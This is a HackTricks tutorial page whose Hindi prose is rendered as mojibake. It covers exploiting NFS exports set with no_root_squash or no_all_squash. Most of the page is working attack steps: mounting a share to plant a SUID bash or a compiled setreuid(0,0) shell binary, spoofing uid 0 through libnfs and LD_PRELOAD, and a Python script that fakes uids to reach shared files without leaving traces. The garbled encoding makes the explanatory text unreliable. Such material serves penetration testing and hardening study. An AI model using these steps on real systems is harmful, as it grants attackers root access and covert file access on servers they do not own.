<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>


_ **/etc/exports** _ рдлрд╛рдЗрд▓ рдкрдврд╝реЗрдВ, рдпрджрд┐ рдЖрдкрдХреЛ рдХреЛрдИ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдорд┐рд▓рддреА рд╣реИ рдЬреЛ **no\_root\_squash** рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЧрдИ рд╣реИ, рддреЛ рдЖрдк рдЙрд╕реЗ **рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХреНрд╕реЗрд╕** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ **рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреИрд╕реЗ рдХрд┐ рдЖрдк рдЙрд╕ рдорд╢реАрди рдХреЗ рд╕реНрдерд╛рдиреАрдп **рд░реВрдЯ** рд╣реЛрдВред

**no\_root\_squash**: рдпрд╣ рд╡рд┐рдХрд▓реНрдк рдореВрд▓ рд░реВрдк рд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдкрд░ рд░реВрдЯ рдпреВрдЬрд░ рдХреЛ NFS рд╕рд░реНрд╡рд░ рдкрд░ рдлрд╛рдЗрд▓реЛрдВ рддрдХ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рджреЗрддрд╛ рд╣реИред рдФрд░ рдпрд╣ рдЧрдВрднреАрд░ рд╕реБрд░рдХреНрд╖рд╛ рдирд┐рд╣рд┐рддрд╛рд░реНрдереЛрдВ рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**no\_all\_squash:** рдпрд╣ **no\_root\_squash** рд╡рд┐рдХрд▓реНрдк рдХреЗ рд╕рдорд╛рди рд╣реИ рд▓реЗрдХрд┐рди **рдЧреИрд░-рд░реВрдЯ рдпреВрдЬрд░реНрд╕** рдкрд░ рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИред рдХрд▓реНрдкрдирд╛ рдХреАрдЬрд┐рдП, рдЖрдкрдХреЗ рдкрд╛рд╕ nobody рдпреВрдЬрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рд╢реЗрд▓ рд╣реИ; /etc/exports рдлрд╛рдЗрд▓ рдХреА рдЬрд╛рдВрдЪ рдХреА; no\_all\_squash рд╡рд┐рдХрд▓реНрдк рдореМрдЬреВрдж рд╣реИ; /etc/passwd рдлрд╛рдЗрд▓ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ; рдПрдХ рдЧреИрд░-рд░реВрдЯ рдпреВрдЬрд░ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░реЗрдВ; рдЙрд╕ рдпреВрдЬрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ suid рдлрд╛рдЗрд▓ рдмрдирд╛рдПрдВ (nfs рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдорд╛рдЙрдВрдЯ рдХрд░рдХреЗ)ред nobody рдпреВрдЬрд░ рдХреЗ рд░реВрдк рдореЗрдВ suid рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ рдФрд░ рдЕрд▓рдЧ рдпреВрдЬрд░ рдмрдиреЗрдВред

# рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐

## рд░рд┐рдореЛрдЯ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ

рдпрджрд┐ рдЖрдкрдиреЗ рдпрд╣ рдХрдордЬреЛрд░реА рдкрд╛рдИ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* **рдЙрд╕ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рдирд╛** рдХреНрд▓рд╛рдЗрдВрдЯ рдорд╢реАрди рдореЗрдВ, рдФрд░ **рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдкреА рдХрд░рдирд╛** рдорд╛рдЙрдВрдЯреЗрдб рдлреЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ **/bin/bash** рдмрд╛рдЗрдирд░реА рдФрд░ рдЙрд╕реЗ **SUID** рдЕрдзрд┐рдХрд╛рд░ рджреЗрдирд╛, рдФрд░ **рдкреАрдбрд╝рд┐рдд** рдорд╢реАрди рд╕реЗ рдЙрд╕ рдмрд╛рд╢ рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ред
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **рдЙрд╕ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рдирд╛** рдХреНрд▓рд╛рдЗрдВрдЯ рдорд╢реАрди рдореЗрдВ, рдФрд░ **рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдкреА рдХрд░рдирд╛** рдорд╛рдЙрдВрдЯреЗрдб рдлреЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ рд╣рдорд╛рд░рд╛ рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдпрд╛ рд╣реБрдЖ рдкреЗрд▓реЛрдб рдЬреЛ SUID рдЕрдиреБрдорддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛, рдЙрд╕реЗ **SUID** рдЕрдзрд┐рдХрд╛рд░ рджреЗрдирд╛, рдФрд░ **рдкреАрдбрд╝рд┐рдд** рдорд╢реАрди рд╕реЗ рдЙрд╕ рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ (рдЖрдк рдпрд╣рд╛рдБ рдХреБрдЫ [C SUID рдкреЗрд▓реЛрдбреНрд╕](payloads-to-execute.md#c) рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ)ред
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## рд╕реНрдерд╛рдиреАрдп рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдорд╢реАрди рд╕реЗ рдкреАрдбрд╝рд┐рдд рдорд╢реАрди рддрдХ рдПрдХ **рдЯрдирд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдЗрд╕ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдПрд╕реНрдХреЗрд▓реЗрд╢рди рдХреЛ рджреВрд░рд╕реНрде рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдкреЛрд░реНрдЯреНрд╕ рдХреЛ рдЯрдирд▓рд┐рдВрдЧ рдХрд░рдХреЗ рд░рд┐рдореЛрдЯ рд╡рд░реНрдЬрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд╛рд▓ рддрдм рд╣реИ рдЬрдм рдлрд╛рдЗрд▓ `/etc/exports` **рдПрдХ IP рд╕рдВрдХреЗрдд рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк **рдХрд┐рд╕реА рднреА рдорд╛рдорд▓реЗ рдореЗрдВ рджреВрд░рд╕реНрде рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдВрдЧреЗ** рдФрд░ рдЖрдкрдХреЛ рдЗрд╕ рдЪрд╛рд▓ рдХрд╛ **рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛**ред\
рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдФрд░ рдЖрд╡рд╢реНрдпрдХ рд╢рд░реНрдд рдпрд╣ рд╣реИ рдХрд┐ `/etc/export` рдХреЗ рдЕрдВрджрд░ **рдирд┐рд░реНрдпрд╛рдд рдХреЛ `insecure` рдлреНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП**ред\
\--_рдореБрдЭреЗ рдпрдХреАрди рдирд╣реАрдВ рд╣реИ рдХрд┐ рдЕрдЧрд░ `/etc/export` рдПрдХ IP рдкрддреЗ рдХрд╛ рд╕рдВрдХреЗрдд рдХрд░ рд░рд╣рд╛ рд╣реИ рддреЛ рдпрд╣ рдЪрд╛рд▓ рдХрд╛рдо рдХрд░реЗрдЧреА_--
{% endhint %}

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ рд╕реНрдерд╛рдиреАрдп рдорд╢реАрди рдкрд░ рдорд╛рдЙрдВрдЯ рдХрд┐рдП рдЧрдП NFS рд╢реЗрдпрд░ рдХрд╛ рд╢реЛрд╖рдг рд╢рд╛рдорд┐рд▓ рд╣реИ, NFSv3 рд╡рд┐рдирд┐рд░реНрджреЗрд╢ рдореЗрдВ рдПрдХ рджреЛрд╖ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддреЗ рд╣реБрдП рдЬреЛ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рдЕрдкрдирд╛ uid/gid рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рддрд╛ рд╣реИред рд╢реЛрд╖рдг рдореЗрдВ [libnfs](https://github.com/sahlberg/libnfs) рдХрд╛ рдЙрдкрдпреЛрдЧ рд╢рд╛рдорд┐рд▓ рд╣реИ, рдПрдХ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдЬреЛ NFS RPC рдХреЙрд▓реНрд╕ рдХреА рдЬрд╛рд▓рд╕рд╛рдЬреА рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

### рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рд╕рдВрдХрд▓рди

рдкреБрд╕реНрддрдХрд╛рд▓рдп рд╕рдВрдХрд▓рди рдЪрд░рдгреЛрдВ рдореЗрдВ рдХрд░реНрдиреЗрд▓ рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╕рдорд╛рдпреЛрдЬрди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред рдЗрд╕ рд╡рд┐рд╢реЗрд╖ рдорд╛рдорд▓реЗ рдореЗрдВ, fallocate рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓реНрд╕ рдХреЛ рдЯрд┐рдкреНрдкрдгреА рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рд╕рдВрдХрд▓рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрджреЗрд╢реЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддреА рд╣реИ:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЛ рдЕрдВрдЬрд╛рдо рджреЗрдирд╛

рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдореЗрдВ рдПрдХ рд╕рд░рд▓ C рдкреНрд░реЛрдЧреНрд░рд╛рдо (`pwn.c`) рдмрдирд╛рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬреЛ рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдПрдХ рд╢реЗрд▓ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИред рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рд╕рдВрдХрд▓рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдкрд░рд┐рдгрд╛рдореА рдмрд╛рдЗрдирд░реА (`a.out`) рдХреЛ suid рд░реВрдЯ рдХреЗ рд╕рд╛рде рд╢реЗрдпрд░ рдкрд░ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, `ld_nfs.so` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ RPC рдХреЙрд▓реНрд╕ рдореЗрдВ uid рдХреЛ рдирдХрд▓реА рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП:

1. **рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЛрдб рдХреЛ рд╕рдВрдХрд▓рд┐рдд рдХрд░реЗрдВ:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЛ рд╢реЗрдпрд░ рдкрд░ рд░рдЦреЗрдВ рдФрд░ uid рдХреЛ рдирдХрд▓реА рдмрдирд╛рдХрд░ рдЗрд╕рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдВ рдмрджрд▓реЗрдВ:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ:**
```bash
/mnt/share/a.out
#root
```

## рдмреЛрдирд╕: рдЪреБрдкрдХреЗ рд╕реЗ рдлрд╛рдЗрд▓ рдПрдХреНрд╕реЗрд╕ рдХреЗ рд▓рд┐рдП NFShell
рдПрдХ рдмрд╛рд░ рд░реВрдЯ рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рд╣реЛ рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж, рдмрд┐рдирд╛ рдорд╛рд▓рд┐рдХрд╛рдирд╛ рд╣рдХ рдмрджрд▓реЗ (рдирд┐рд╢рд╛рди рдЫреЛрдбрд╝рдиреЗ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП) NFS рд╢реЗрдпрд░ рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ Python рд╕реНрдХреНрд░рд┐рдкреНрдЯ (nfsh.py) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ uid рдХреЛ рдЙрд╕ рдлрд╛рдЗрд▓ рдХреЗ рдЕрдиреБрд░реВрдк рд╕рдорд╛рдпреЛрдЬрд┐рдд рдХрд░рддреА рд╣реИ рдЬрд┐рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╢реЗрдпрд░ рдкрд░ рдлрд╛рдЗрд▓реЛрдВ рдХреЗ рд╕рд╛рде рдмрд┐рдирд╛ рдЕрдиреБрдорддрд┐ рд╕рдорд╕реНрдпрд╛рдУрдВ рдХреЗ рдЗрдВрдЯрд░реИрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИ:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
рдЗрд╕ рддрд░рд╣ рдЪрд▓рд╛рдПрдВ:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
# рд╕рдВрджрд░реНрдн
* https://www.errno.fr/nfs_privesc.html


<details>

<summary><strong> AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ </strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
